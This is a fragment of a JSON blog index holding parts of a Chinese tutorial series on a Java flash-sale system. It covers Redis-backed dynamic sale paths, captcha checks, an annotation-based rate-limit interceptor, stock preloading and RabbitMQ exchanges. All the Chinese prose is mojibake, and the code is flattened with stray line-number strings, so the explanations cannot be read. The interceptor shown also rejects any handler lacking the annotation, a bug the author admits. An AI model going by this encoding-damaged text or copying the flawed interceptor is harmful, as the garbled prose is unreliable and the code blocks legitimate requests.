æ€§ï¼Œä¸€èˆ¬ç”¨äºç›´æ’­æˆ–è€…æ˜¯è¯­éŸ³é€šè¯ TCPæ˜¯åŸºäºå­—èŠ‚æµçš„ä¼ è¾“å±‚åè®®ï¼Œå®ƒæ¯”è¾ƒæ…¢ï¼›UDPæ¯”è¾ƒå¿« 10. ArrayList åº•å±‚æ˜¯æ•°ç»„ï¼ŒæŸ¥è¯¢å¿«ï¼Œå¢åˆ æ…¢ å®ƒçš„é»˜è®¤å¤§å°æ˜¯10ï¼Œæ·»åŠ å€¼çš„æ—¶å€™ä¼šå…ˆå¯¹å½“å‰æ•°ç»„å¤§å°å’Œæ€»å¤§å°è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥å‡ºç°è¶…è¿‡æœ€å¤§å®¹é‡çš„è¯ï¼Œå°±è¦è¿›è¡Œæ‰©å®¹ï¼Œæ‰©å®¹çš„å¤§å°æ˜¯åŸæ¥å¤§å°çš„1.5å€ï¼ˆå³ç§»è¿ç®—ç¬¦ï¼Œå³ç§»1ä½ï¼‰ï¼Œå†å°†ä¹‹å‰çš„æ•°æ®å¤åˆ¶åˆ°æ–°çš„æ•°ç»„é‡Œè¾¹ã€‚","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://blog.kayleh.top/tags/project/"}]},{"title":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ(9)","slug":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (8)","date":"2020-11-09T04:14:45.000Z","updated":"2021-04-15T15:25:35.649Z","comments":true,"path":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (8)/","link":"","permalink":"https://blog.kayleh.top/Java%E9%AB%98%E6%80%A7%E8%83%BD%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%20-%20%E5%89%AF%E6%9C%AC%20(8)/","excerpt":"","text":"1. åŠ¨æ€ç§’æ€åœ°å€1.1 å‰ç«¯çš„æ”¹å˜ä¹‹å‰æˆ‘ä»¬å®ç°ç§’æ€çš„æ—¶å€™æ˜¯ç›´æ¥è·³è½¬åˆ°ç§’æ€æ¥å£ï¼Œä½¿å¾—æˆ‘ä»¬æ¯æ¬¡çš„ç§’æ€åœ°å€éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¿™æ ·å…·æœ‰å®‰å…¨éšæ‚£ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å°†å…¶æ”¹ä¸ºåŠ¨æ€åœ°å€ï¼Œé€šè¿‡åœ¨å‰ç«¯ä¸Šå†™ä¸€ä¸ªæ–¹æ³•è¿›è¡Œè·³è½¬ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ å®ƒä¼šå…ˆè·³è½¬åˆ°/miaosha/pathï¼Œè·å–ç§’æ€åœ°å€ä¸­çš„pathå€¼ï¼Œå°†å…¶å­˜å‚¨åœ¨Redisä¸­ ç„¶åæºå¸¦pathå€¼å»è®¿é—®çœŸæ­£çš„ç§’æ€æ–¹æ³•ï¼Œåœ¨å…¶ä¸­å°†pathå€¼ä¸Redisä¸­çš„å€¼è¿›è¡Œæ¯”è¾ƒï¼Œä¸€è‡´æ‰èƒ½ç»§ç»­ç§’æ€ 1.2 è·å–è·¯å¾„çš„Javaä»£ç  @ResponseBody @RequestMapping(value = &quot;/path&quot;,method = RequestMethod.GET) public Result&lt;String&gt; getMiaoshaPath(MiaoShaUser user,@RequestParam(&quot;goodsId&quot;)long goodsId, @RequestParam(value = &quot;verifyCode&quot;,defaultValue = &quot;0&quot;)int verifyCode){ if(user == null) return Result.error(CodeMsg.SESSION_ERROR); String path = miaoshaService.createMiaoshaPath(user,goodsId); return Result.success(path); } 123456789101112 å…ˆè°ƒç”¨createMiaoshaPath()æ–¹æ³•ï¼Œåœ¨å…¶ä¸­ä¼šåˆ›å»ºä¸€ä¸²éšæœºå€¼ï¼Œå¹¶ä¸”å­˜å‚¨åˆ°Redisä¸­ï¼Œå…·ä½“æ–¹æ³•å¦‚ä¸‹ï¼Œæ‰§è¡Œå®Œä¹‹åå°†è·¯å¾„å€¼è¿”å›åˆ°å‰ç«¯ public String createMiaoshaPath(MiaoShaUser user, long goodsId) { if(user == null || goodsId &lt;= 0) return null; String str = MD5Util.md5(UUIDUtil.getUUID()); redisService.set(MiaoshaKey.miaoshaPathPrefix,user.getId() + &quot;_&quot; + goodsId,str); return str; } 123456789 1.3 æ‰§è¡Œç§’æ€æ¥å£çš„ä¿®æ”¹åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° è·¯å¾„ä¸Šï¼Œæˆ‘ä»¬é‡‡ç”¨äº†RestFulé£æ ¼ï¼Œé€šè¿‡@PathVariableæ³¨è§£è·å–å…¶ä¸­çš„è·¯å¾„å€¼ï¼Œå¹¶ä¸redisæœåŠ¡å™¨ä¸­çš„å€¼è¿›è¡Œæ¯”è¾ƒï¼Œä¸€è‡´æ‰èƒ½å‘ä¸‹ä¸€æ­¥ç»§ç»­æ‰§è¡Œ 2. æ·»åŠ éªŒè¯ç éªŒè¯æˆ‘ä»¬åœ¨ç«‹å³ç§’æ€æŒ‰é’®å¤„æ·»åŠ éªŒè¯ç ï¼Œé˜²æ­¢æœºå™¨äººå¯¹æˆ‘ä»¬çš„ç³»ç»Ÿè¿›è¡Œå¤šæ¬¡ç§’æ€ï¼Œä¹Ÿå¯ä»¥ä½¿ç§’æ€èƒ½å¤Ÿé”™å³°è®¿é—®ï¼Œå‰Šå‡å¹¶å‘é‡ï¼Œæˆ‘ä»¬é‡‡ç”¨çš„æ˜¯ScriptEngine 2.1 å®ç°è¿‡ç¨‹ é¦–å…ˆï¼Œæˆ‘ä»¬åœ¨è·¯å¾„è·å–ä¸­ï¼Œæ·»åŠ äº†å¯¹éªŒè¯ç éªŒè¯çš„æ­¥éª¤åœ¨è¯¥æ–¹æ³•ä¸­ï¼Œå®ç°çš„æ˜¯å°†ä»å‰ç«¯è·å–çš„éªŒè¯ç ä¸Rediså­˜å‚¨çš„éªŒè¯ç è¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯å®Œæˆä¹‹åï¼Œå°±å°†å®ƒä»Redisä¸­ç§»é™¤ï¼Œæ–¹æ³•ä»£ç å¦‚ä¸‹ åœ¨æ­¤ä¹‹å‰ï¼Œå‰ç«¯éªŒè¯ç ä¼šå’Œåç«¯æœ‰ä¸€ä¸ªå“åº”ï¼Œæ¯æ¬¡åˆ·æ–°éªŒè¯ç éƒ½ä¼šå°†å…¶çš„æ­£ç¡®ç»“æœåŒæ­¥åˆ°æœåŠ¡å™¨çš„Redisä¸Š 3. æ¥å£é™æµé˜²åˆ· æ¥å£é™æµé˜²åˆ·çš„ä½œç”¨æ˜¯åœ¨è§„å®šçš„æ—¶é—´å†…è®¿é—®å›ºå®šçš„æ¬¡æ•°ã€‚æˆ‘ä»¬å®ç°çš„æ€è·¯æ˜¯ï¼Œåœ¨è¦é™åˆ¶é˜²åˆ·çš„æ–¹æ³•ä¸Šæ·»åŠ æ³¨è§£ï¼Œé€šè¿‡æ‹¦æˆªå™¨è¿›è¡Œé™åˆ¶è®¿é—®æ¬¡æ•° 3.1 åˆ›å»ºå‡ºè¿™ä¸ªæ³¨è§£è¯¥æ³¨è§£ä¸­ï¼ŒåŒ…å«äº†éœ€è¦è®¿é—®æ—¶é—´å†…çš„è®¿é—®æ¬¡æ•°ï¼Œä»¥åŠåˆ¤æ–­æ˜¯å¦éœ€è¦ç™»å½• @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.METHOD) public @interface AccessLimit { int seconds(); int maxCount(); boolean needLogin() default true; } 1234567 @Retention(RetentionPolicy.RUNTIME)ï¼šæ³¨è§£ä¸ä»…è¢«ä¿å­˜åˆ°classæ–‡ä»¶ä¸­ï¼ŒjvmåŠ è½½classæ–‡ä»¶ä¹‹åï¼Œä»ç„¶å­˜åœ¨ï¼› @Target(ElementType.METHOD)ï¼šè¡¨ç¤ºæ³¨è§£ä¿®é¥°çš„æ˜¯æ–¹æ³• å¯¹æˆ‘ä»¬æƒ³è¦é™æµçš„æ–¹æ³•è¿›è¡Œæ ‡è®° 3.2 åˆ›å»ºæ‹¦æˆªå™¨public class AccessInterceptor extends HandlerInterceptorAdapter { @Autowired MiaoShaUserService userService; @Autowired RedisService redisService; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { if(handler instanceof HandlerMethod){ MiaoShaUser user = getUser(request,response); UserContext.setUser(user); HandlerMethod hm = (HandlerMethod) handler; //å¤„ç†æ–¹æ³•çš„å¯¹è±¡ï¼Œè·å–çš„æ˜¯æ–¹æ³•çš„æ³¨è§£ AccessLimit accessLimit = hm.getMethodAnnotation(AccessLimit.class); if(accessLimit == null){ return false; } int seconds = accessLimit.seconds(); int maxCount = accessLimit.maxCount(); boolean needLogin = accessLimit.needLogin(); String key = request.getRequestURI();//è·å–è¯·æ±‚çš„åœ°å€ if (needLogin) { if(user == null){ //userä¸ºç©ºï¼Œé€’äº¤é”™è¯¯ä¿¡æ¯ render(response, CodeMsg.SESSION_ERROR); return false; } key += &quot;_&quot; + user.getId(); } AccessKey accessKey = AccessKey.withExpireSecond(seconds); Integer count = redisService.get(accessKey, key, Integer.class); if(count == null){ redisService.set(accessKey,key,1); }else if(count &lt; maxCount){ redisService.incr(accessKey,key); }else{ render(response,CodeMsg.ACCESS_LIMIT_REACHED); return false; } } return true; } ...... } 12345678910111213141516171819202122232425262728293031323334353637383940414243444546 ç»§æ‰¿HandlerInterceptorAdapterï¼Œé‡å†™preHandleæ–¹æ³• é‡è¦çš„UserContextæˆ‘ä»¬çœ‹ä¸€ä¸‹å…·ä½“çš„å®ç° public class UserContext { //ç”¨ThreadLocalæ¥è£…userä¿¡æ¯ï¼Œè°ƒç”¨å®ƒçš„setå’Œgetæ–¹æ³•ï¼Œå‘å…¶ä¸­å­˜å‚¨å€¼ //ThreadLocalæ˜¯ä¸ºå½“å‰çº¿ç¨‹å­˜å‚¨å€¼ï¼Œæ‰€ä»¥ï¼Œåœ¨å¤šçº¿ç¨‹ä¸‹ï¼Œå„ä¸ªçº¿ç¨‹çš„userå¹¶ä¸å†²çª private static ThreadLocal&lt;MiaoShaUser&gt; userHolder = new ThreadLocal&lt;&gt;(); public static void setUser(MiaoShaUser user){ userHolder.set(user); } public static MiaoShaUser getUser(){ return userHolder.get(); } } 1234567891011121314 å…¶ä¸­ThreadLocal()æºç å¦‚ä¸‹ 3.3 ååºæ­¥éª¤è§£é‡Šæ–¹æ³•åè¾¹æ¯”è¾ƒç®€å•å•¦ 3.4 åˆ‡è«å¿˜è®°é…ç½®ï¼Œä¸é…ç½®çº¦ç­‰äºä¸åŠ æ‹¦æˆªå™¨@Configuration public class WebConfig extends WebMvcConfigurerAdapter{ @Autowired UserArgumentResolver userArgumentResolver; @Autowired AccessInterceptor accessInterceptor; @Override public void addArgumentResolvers(List&lt;HandlerMethodArgumentResolver&gt; argumentResolvers) { super.addArgumentResolvers(argumentResolvers); argumentResolvers.add(userArgumentResolver); } @Override public void addInterceptors(InterceptorRegistry registry) { InterceptorRegistration interceptorRegistration = registry.addInterceptor(accessInterceptor); interceptorRegistration.addPathPatterns(&quot;/miaosha/path&quot;); } } 123456789101112131415161718192021 åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° åœ¨è¿™ä¸ªé…ç½®ç±»ä¸­ï¼Œæˆ‘ä»¬é‡å†™çš„æ˜¯addInterceptorsæ–¹æ³•ï¼Œå°†æ‹¦æˆªå™¨æ³¨å…¥è¿›æ¥ï¼ŒåŠ åˆ°é…ç½®ä¸­ï¼Œ(æŒ‡å®šè¦æ‹¦æˆªçš„åœ°å€è¿™ä¸€æ­¥å¯ä»¥çœç•¥æ‰äº†ï¼Œå› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯æ³¨è§£æ ‡è®°ï¼Œå‰è¾¹æœ‰ä¸€å¤„å†™é”™ï¼Œå¼€å§‹å†™çš„æ˜¯æ²¡æœ‰æ³¨è§£çš„è¯ï¼Œè¿”å›falseï¼Œè¿™æ ·å…¨å±€éƒ½è¢«æ‹¦æˆªäº†ï¼Œåº”è¯¥å†™æˆtrueï¼Œè¿™æ ·æ‰èƒ½æ”¾è¡Œï¼‰ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨äº†ï¼","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://blog.kayleh.top/tags/project/"}]},{"title":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ(8)","slug":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (7)","date":"2020-11-09T04:12:45.000Z","updated":"2021-04-15T15:25:39.718Z","comments":true,"path":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (7)/","link":"","permalink":"https://blog.kayleh.top/Java%E9%AB%98%E6%80%A7%E8%83%BD%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%20-%20%E5%89%AF%E6%9C%AC%20(7)/","excerpt":"","text":"1. ç§’æ€æ¥å£ä¼˜åŒ–æ€è·¯ é‡ç‚¹æˆ‘ä»¬æ˜¯è¦å‡å°‘å¯¹æ•°æ®åº“çš„è®¿é—® ç³»ç»Ÿåˆå§‹åŒ–æ—¶ï¼Œå°†ç§’æ€å•†å“åº“å­˜åŠ è½½åˆ°Redisä¸­ æ”¶åˆ°è¯·æ±‚ï¼Œåœ¨Redisä¸­é¢„å‡åº“å­˜ï¼Œåº“å­˜ä¸è¶³æ—¶ï¼Œç›´æ¥è¿”å›ç§’æ€å¤±è´¥ ç§’æ€æˆåŠŸï¼Œå°†è®¢å•å‹å…¥æ¶ˆæ¯é˜Ÿåˆ—ï¼Œè¿”å›å‰ç«¯æ¶ˆæ¯â€œæ’é˜Ÿä¸­â€ï¼ˆåƒ12306çš„ä¹°ç¥¨ï¼‰ æ¶ˆæ¯å‡ºé˜Ÿï¼Œç”Ÿæˆè®¢å•ï¼Œå‡å°‘åº“å­˜ å®¢æˆ·ç«¯åœ¨ä»¥ä¸Šè¿‡ç¨‹æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå°†ä¸€ç›´è½®è¯¢æ˜¯å¦ç§’æ€æˆåŠŸ 2. æ¸…æ™°æ¡†å›¾è§£æåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 3. ä»£ç ä¸­æˆ‘ä»¬å¦‚ä½•å®ç°3.1 åº“å­˜é¢„åŠ è½½åˆ°Redisä¸­è¿™é‡Œæˆ‘ä»¬æ˜¯é€šè¿‡å®ç°InitialzingBeanæ¥å£ï¼Œé‡å†™å…¶ä¸­afterPropertiesæ–¹æ³•è¾¾æˆçš„ public class MiaoshaController implements InitializingBean { @Override public void afterPropertiesSet() throws Exception { //ç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™ï¼Œå°±å°†æ•°æ®å­˜å…¥Redis //åŠ è½½æ‰€æœ‰ç§’æ€å•†å“ List&lt;GoodsVo&gt; goodsVos = goodsService.listGoodsVo(); if(goodsVos == null) return; //å­˜å…¥Redisä¸­ï¼Œå„ç§’æ€å•†å“çš„æ•°é‡ for (GoodsVo good : goodsVos){ redisService.set(GoodsKey.miaoshaGoodsStockPrefix,&quot;&quot;+good.getId(),good.getStockCount()); map.put(good.getId(),false); } } ...... } 12345678910111213141516171819 æˆ‘ä»¬å…ˆä»æ•°æ®åº“ä¸­å°†ç§’æ€å•†å“çš„ä¿¡æ¯è¯»å–å‡ºæ¥ï¼Œå†ä¸€ä¸ªä¸€ä¸ªåŠ è½½åˆ°ç¼“å­˜ä¸­ æ³¨æ„ä¸€ä¸‹å…¶ä¸­æœ‰ä¸€ä¸ªmapï¼Œå®ƒæ·»åŠ äº†å¯¹åº”Id-falseçš„é”®å€¼å¯¹ï¼Œå®ƒè¡¨ç¤ºçš„æ˜¯è¯¥å•†å“æ²¡æœ‰è¢«ç§’æ€å®Œï¼Œç”¨äºä¸‹æ–‡ä¸­ï¼Œå½“å•†å“ç§’æ€å®Œï¼Œé˜»æ­¢å…¶å¯¹redisæœåŠ¡çš„è®¿é—®ï¼ˆåæ–‡è¿˜ä¼šæåˆ°ï¼‰ 3.2 å¼€å§‹ç§’æ€ï¼Œé¢„å‡åº“å­˜ //userä¸èƒ½ä¸ºç©ºï¼Œç©ºäº†å»ç™»é™† if(user == null){ return Result.error(CodeMsg.SESSION_ERROR); } //HashMapå†…å­˜æ ‡è®°ï¼Œå‡å°‘Redisè®¿é—®æ—¶é—´ boolean over = map.get(goodsId); if(over) return Result.error(CodeMsg.MIAO_SHA_OVER); //æ”¶åˆ°è¯·æ±‚ï¼Œé¢„å‡åº“å­˜ Long count = redisService.decr(GoodsKey.miaoshaGoodsStockPrefix, &quot;&quot; + goodsId); if(count &lt;= 0){ map.put(goodsId,true); return Result.error(CodeMsg.MIAO_SHA_OVER); } 12345678910111213141516 é¦–å…ˆç”¨æˆ·ä¸èƒ½ä¸ºç©º è¿™é‡Œæˆ‘ä»¬åˆçœ‹è§äº†mapï¼Œå®ƒå†™åœ¨äº†RedisæœåŠ¡å‰è¾¹ï¼Œå½“å•†å“ç§’æ€å®Œæ¯•çš„æ—¶å€™ï¼Œè¿™æ ·å°±èƒ½é˜²æ­¢å®ƒå†å»è®¿é—®RedisæœåŠ¡äº† é¢„å‡åº“å­˜ï¼Œåº“å­˜å°äº0çš„æ—¶å€™å°±è¿”å›ç§’æ€å¤±è´¥ 3.3 åŠ å…¥æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼ˆDirect Exchangeï¼‰ //åˆ¤æ–­æ˜¯å¦å·²ç»ç§’æ€è¿‡äº† MiaoshaOrder miaoshaOrder = orderService.selectMiaoshaOrderByUserIdGoodsId(user.getId(), goodsId); if(miaoshaOrder != null) return Result.error(CodeMsg.REPEATE_MIAOSHA); //åŠ å…¥æ¶ˆæ¯é˜Ÿåˆ— MiaoshaMessage miaoshaMessage = new MiaoshaMessage(); miaoshaMessage.setGoodsId(goodsId); miaoshaMessage.setMiaoShaUser(user); mqSender.sendMiaoshaMessage(miaoshaMessage); 12345678910 åœ¨å…¶ä¹‹å‰æˆ‘ä»¬æœ‰ä¸€ä¸ªåˆ¤æ–­ï¼Œåˆ¤æ–­è¯¥ç”¨æˆ·æ˜¯ä¸æ˜¯é‡å¤ç§’æ€ï¼Œå…¶å®è¿™ä¸€æ­¥æ˜¯å¤šä½™çš„ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨æ•°æ®åº“ä¸­å·²ç»å»ºç«‹äº†å”¯ä¸€ç´¢å¼•ï¼Œå°†userIdå’ŒGoodsIdç»‘å®šåœ¨äº†ä¸€èµ·ï¼Œä¸ä¼šç”Ÿæˆé‡å¤çš„è®¢å• è‡ªå®šä¹‰MiaoshaMessageç±»ï¼Œåˆ›å»ºå¯¹è±¡ï¼Œå…¶ä¸­åŠ å…¥æˆ‘ä»¬æƒ³è¦çš„userå’ŒgoodsIdä¿¡æ¯ï¼Œå¹¶å°†æ¶ˆæ¯å‘å‡ºå» 3.4 æ¶ˆæ¯å‘é€è¿‡ç¨‹ @Autowired AmqpTemplate amqpTemplate; public void sendMiaoshaMessage(MiaoshaMessage miaoshaMessage){ String msg = RedisService.beanToString(miaoshaMessage); log.info(&quot;miaosha send msg:&quot; + msg); amqpTemplate.convertAndSend(MQConfig.MIAOSHA_QUEUE,msg); } 123456789 ç”¨SpringBootæ¡†æ¶æä¾›çš„AmqpTemlplateå®ä¾‹æ¥ä¸ºæˆ‘ä»¬çš„ç§’æ€é˜Ÿåˆ—å‘é€æ¶ˆæ¯ 3.5 æ¶ˆæ¯å‡ºé˜Ÿå¤„ç† @RabbitListener(queues = MQConfig.MIAOSHA_QUEUE) public void receiveMiaoshaMsg(String miaoshaMessage){ log.info(&quot;miaosha receive msg:&quot; + miaoshaMessage); MiaoshaMessage msg = RedisService.stringToBean(miaoshaMessage, MiaoshaMessage.class); long goodsId = msg.getGoodsId(); MiaoShaUser miaoShaUser = msg.getMiaoShaUser(); GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId); //åˆ¤æ–­åº“å­˜ int stock = goodsVo.getStockCount(); if(stock &lt; 0) return; //æœ‰åº“å­˜è€Œä¸”æ²¡ç§’æ€è¿‡ï¼Œå¼€å§‹ç§’æ€ miaoshaService.miaosha(miaoShaUser,goodsVo); } 1234567891011121314151617 åˆ¤æ–­åº“å­˜æ˜¯å¦è¿˜æœ‰ï¼Œæœ‰çš„è¯ï¼Œå‘ä¸‹æ‰§è¡Œç§’æ€ 3.5.1 ç§’æ€æ–¹æ³• @Transactional public OrderInfo miaosha(MiaoShaUser user, GoodsVo goods) { //åº“å­˜å‡ä¸€ boolean success = goodsService.reduceStock(goods); if(success) //ä¸‹è®¢å• return orderService.createOrder(user,goods); else{ setGoodsOver(goods.getId()); return null; } } 12345678910111213 è¯¥æ–¹æ³•æˆ‘ä»¬ç”¨@Transactionalæ³¨è§£æ ‡è®°ï¼Œä¿è¯å‡åº“å­˜å’Œä¸‹è®¢å•éƒ½æ‰§è¡ŒæˆåŠŸ æ³¨æ„å…¶ä¸­æœ‰ä¸€ä¸ªsetGoodsOver()æ–¹æ³•ï¼Œå®ƒçš„ä½œç”¨æ˜¯å½“è¯¥å•†å“åº“å­˜æ²¡æœ‰çš„æ—¶å€™ï¼Œåœ¨redisä¸­å­˜ä¸€ä¸ªæ ‡å¿—ï¼Œä¸‹é¢æˆ‘ä»¬æ¥ç€çœ‹ 3.6 ä¸å‰ç«¯è¿›è¡Œäº¤äº’çš„ç§’æ€ç»“æœ /** * orderId æˆåŠŸ * -1 ç§’æ€å¤±è´¥ * 0 ç»§ç»­è½®è¯¢ * @param miaoShaUser * @param goodsId * @return */ @RequestMapping(value = &quot;/result&quot;,method = RequestMethod.GET) @ResponseBody public Result&lt;Long&gt; miaoshaResult(MiaoShaUser miaoShaUser, @RequestParam(&quot;goodsId&quot;)long goodsId){ if(miaoShaUser == null) return Result.error(CodeMsg.SESSION_ERROR); long result = miaoshaService.getMiaoshaResult(miaoShaUser.getId(),goodsId); return Result.success(result); } 123456789101112131415161718 è¿™é‡Œå†™äº†ä¸€ä¸ª/resuletè¯·æ±‚ï¼Œå‰ç«¯ä¼šæ ¹æ®è¿”å›å€¼ï¼Œæ¥åˆ¤æ–­ç§’æ€çš„çŠ¶æ€ 3.6.1 getMiaoshaResultæ–¹æ³• public long getMiaoshaResult(long userId, long goodsId) { MiaoshaOrder order = orderService.selectMiaoshaOrderByUserIdGoodsId(userId, goodsId); if(order != null){ //ç§’æ€æˆåŠŸ return order.getOrderId(); }else { boolean isOver = getGoodsOver(goodsId); if(isOver) return -1; else //ç»§ç»­è½®è¯¢ return 0; } } 123456789101112131415 ç”¨æˆ·åœ¨ç§’æ€è¯¥å•†å“çš„è¿‡ç¨‹ä¸­ï¼Œåœ¨å¾—åˆ°ç§’æ€ç»“æœä¹‹å‰ï¼Œä¼šä¸€ç›´è¿›è¡Œè½®è¯¢ï¼Œç›´åˆ°è¿”å›orderIdæˆ–è€…-1æ¥å‘ŠçŸ¥ç§’æ€æˆåŠŸä¸å¤±è´¥ è¯¥æ–¹æ³•ä¸­ï¼Œä»æ•°æ®åº“ä¸­çœ‹çœ‹èƒ½ä¸èƒ½æŸ¥è¯¢åˆ°ç§’æ€è®¢å•ä¿¡æ¯ï¼Œæœ‰è¯´æ˜ç§’æ€æˆåŠŸï¼Œè¿”å›è®¢å•å·ï¼›å¤±è´¥äº†åˆ™è·å–redisä¸­çš„æ˜¯å¦ç§’æ€å®Œçš„æ ‡å¿—ï¼Œè·Ÿå‰è¾¹setGoodsOver()ç›¸å¯¹åº”ï¼Œè¿™é‡Œçš„getGoodsOver()ä¾¿æ˜¯å¯¹setçš„å€¼è¿›è¡Œè·å–ï¼Œå¦‚æœæ²¡æœ‰åº“å­˜äº†åˆ™è¯´æ˜ç§’æ€å¤±è´¥äº†ï¼Œå¦åˆ™è¦ç»§ç»­è½®è¯¢äº†ï¼ˆå·²ç»ç§’æ€åˆ°ï¼Œä½†æ˜¯è®¢å•è¿˜æ²¡æœ‰åˆ›å»ºå®Œæˆï¼‰","categories":[],"tags":[{"name":"project","slug":"project","permalink":"https://blog.kayleh.top/tags/project/"}]},{"title":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ(7)","slug":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (6)","date":"2020-11-08T04:17:45.000Z","updated":"2021-04-15T15:25:43.088Z","comments":true,"path":"Javaé«˜æ€§èƒ½é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿ - å‰¯æœ¬ (6)/","link":"","permalink":"https://blog.kayleh.top/Java%E9%AB%98%E6%80%A7%E8%83%BD%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%20-%20%E5%89%AF%E6%9C%AC%20(6)/","excerpt":"","text":"1. é›†æˆRabbitMQ1.1 æ·»åŠ ä¾èµ–åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 1.2 æ·»åŠ é…ç½®ä¿¡æ¯åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2. è¿›è¡Œç®€å•æµ‹è¯•ï¼ˆDirect Exchangeï¼‰ ä»»ä½•å‘é€åˆ°Direct Exchangeçš„æ¶ˆæ¯éƒ½ä¼šè¢«è½¬å‘åˆ°RouteKeyä¸­æŒ‡å®šçš„Queue 2.1 åˆ›å»ºä¸€ä¸ªé…ç½®ç±»@Configuration public class MQConfig { public static final String QUEUE_NAME = &quot;queue&quot;; @Bean public Queue queue(){ return new Queue(QUEUE_NAME,true); } } 12345678910 2.1.1 @Beanæ³¨è§£ @Beanæ³¨è§£å°±æ˜¯è¦å‘Šè¯‰æ–¹æ³•ï¼Œäº§ç”Ÿä¸€ä¸ªBeanå¯¹è±¡ï¼Œå¹¶å°†è¿™ä¸ªBeanç”±Springå®¹å™¨ç®¡ç†ã€‚äº§ç”Ÿè¿™ä¸ªBeanå¯¹è±¡çš„æ–¹æ³•Springåªä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œéšåè¿™ä¸ªBeanå°†æ”¾åœ¨IOCå®¹å™¨ä¸­ã€‚ SpringIOCå®¹å™¨ç®¡ç†ä¸€ä¸ªæˆ–è€…å¤šä¸ªBeanï¼Œè¿™äº›Beanéƒ½éœ€è¦åœ¨@Configurationæ³¨è§£ä¸‹è¿›è¡Œåˆ›å»º 2.2 åˆ›å»ºæ¶ˆæ¯çš„æ¥å—å™¨@Service @Slf4j public class MQReceiver { @RabbitListener(queues = MQConfig.QUEUE_NAME) public void receive(String message){ log.info(&quot;receive message:&quot; + message); } } 123456789 2.2.1 @RabbitListeneræ³¨è§£ @RabbitListenerï¼Œå…¶ä¸­queueså±æ€§é€šè¿‡è¯†åˆ«é˜Ÿåˆ—çš„åå­—æ¥æ¥å—æ¶ˆæ¯è¿›è¡Œæ¶ˆè´¹ 2.3 åˆ›å»ºæ¶ˆæ¯çš„å‘é€å™¨@Service @Slf4j public class MQSender { @Autowired //AmqpTemplateæ¥å£å®šä¹‰äº†å‘é€å’Œæ¥æ”¶æ¶ˆæ¯çš„åŸºæœ¬æ“ä½œ AmqpTemplate amqpTemplate; public void send(Object message){ String msg = RedisService.beanToString(message); log.info(&quot;send message:&quot; + msg); amqpTemplate.convertAndSend(MQConfig.QUEUE_NAME,msg); } } 1234567891011121314 æµ‹è¯•é€šè¿‡ â†“ 3. é¢„å…ˆé…ç½®åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 4. Topic Exchange ä»»ä½•å‘é€åˆ°Topic Exchangeçš„æ¶ˆæ¯éƒ½ä¼šè¢«è½¬å‘åˆ°ä¸routingKeyåŒ¹é…çš„é˜Ÿåˆ—ä¸Š 4.1 è¿›è¡Œé…ç½®åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 4.2 ç¼–å†™æ¶ˆæ¯å‘é€è€…åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 4.3 ç¼–å†™æ¶ˆæ¯æ¥æ”¶å™¨åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 4.4 æµ‹è¯•ç»“æœ æˆ‘ä»¬åªç»‘å®šäº†é˜Ÿåˆ—1å’Œé˜Ÿåˆ—2ï¼Œæ ¹æ®æ¶ˆæ¯å‘é€è€…ï¼Œä¼šä¸ºé˜Ÿåˆ—1å’Œé˜Ÿåˆ—2å„å‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œé˜Ÿåˆ—1å’Œé˜Ÿåˆ—2å„æ”¶åˆ°ä¸€æ¡æ¶ˆæ¯ æµ‹è¯•å†…å®¹ æµ‹è¯•ç»“æœ 5. Fanout Exchange ä»»ä½•å‘é€åˆ°Fanout Exchangeçš„æ¶ˆæ¯éƒ½ä¼šè¢«è½¬å‘åˆ°ä¸ä¹‹ç»‘å®šçš„é˜Ÿåˆ—ä¸Š 5.1 è¿›è¡Œé…ç½®åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 5.2 